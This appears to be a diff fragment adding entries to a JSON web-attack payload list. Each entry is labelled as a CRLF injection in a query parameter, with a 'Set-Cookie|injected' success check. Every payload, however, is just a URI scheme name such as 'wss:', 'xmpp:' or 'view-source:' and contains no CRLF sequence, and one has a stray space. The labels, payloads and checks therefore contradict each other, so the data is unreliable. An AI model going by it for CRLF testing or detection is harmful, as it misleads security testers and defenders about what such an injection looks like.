+    "injection_point": "query_parameter",
+    "payload_string": "uuid:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393930",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "vemmi:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393931",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ventrilo:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393932",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "view-source:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393933",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "wais:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393934",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "webcal:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393935",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "wss:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393936",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ws:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393937",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "wtai:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393938",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "wyciwyg:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393939",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "xfire:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393940",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "xmlrpc.beeps:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393941",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "xmlrpc.beep :",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393942",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "xmpp:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393943",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "xri:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393944",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ymsgr:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393945",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "z39.50r:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393946",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "z39.50s:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
   }
 ]
